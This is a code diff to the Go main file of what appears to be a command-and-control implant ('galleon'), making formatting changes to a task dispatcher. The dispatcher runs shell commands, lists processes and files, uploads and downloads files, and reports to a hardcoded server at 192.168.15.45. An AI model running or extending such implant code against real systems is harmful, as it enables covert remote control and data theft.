@@ -1,11 +1,13 @@
+//go:build linux
+
 package main
 
 import (
 	"encoding/json"
 	"fmt"
 	"galleon/agent_helper"
-	"time"
 	"os"
+	"time"
 )
 
 func ParseTasks(serverUrl string, tasking string) (string, error) {
@@ -25,31 +27,29 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 
 func TaskHandler(taskData map[string]interface{}, url string, serverUrl string) {
 	switch taskData["task"] {
-		case "ls":
-			agent_helper.LsHandler(url, taskData)
-		case "ps":
-			agent_helper.PsHandler(url, taskData)
-		case "exec_bg":
-			agent_helper.ExecBgHandler(url, taskData)
-		case "exec_fg":
-			agent_helper.ExecFgHandler(url, taskData)
-		case "reconfig":
-			agent_helper.ReconfigHandler(url, taskData)
-		case "kill":
-			agent_helper.SendDeathMessage(serverUrl, taskData["session"].(string))
-			agent_helper.DataShipper(url, taskData, "true")
-			agent_helper.TerminateImplant()
-		case "download":
-			agent_helper.DownloadHandler(url, taskData)
-		case "upload":
-			agent_helper.UploadHandler(url, taskData)
-		}
+	case "ls":
+		agent_helper.LsHandler(url, taskData)
+	case "ps":
+		agent_helper.PsHandler(url, taskData)
+	case "exec_bg":
+		agent_helper.ExecBgHandler(url, taskData)
+	case "exec_fg":
+		agent_helper.ExecFgHandler(url, taskData)
+	case "reconfig":
+		agent_helper.ReconfigHandler(url, taskData)
+	case "kill":
+		agent_helper.SendDeathMessage(serverUrl, taskData["session"].(string))
+		agent_helper.DataShipper(url, taskData, "true")
+		agent_helper.TerminateImplant()
+	case "download":
+		agent_helper.DownloadHandler(url, taskData)
+	case "upload":
+		agent_helper.UploadHandler(url, taskData)
+	}
 }
 
-
-
 func main() {
-	
+
 	os.Clearenv()
 	retryCounter := 0
 	serverUrl := "https://192.168.15.45:8000"
@@ -91,4 +91,3 @@ func main() {
 		timer.Stop()
 	}
 }
-
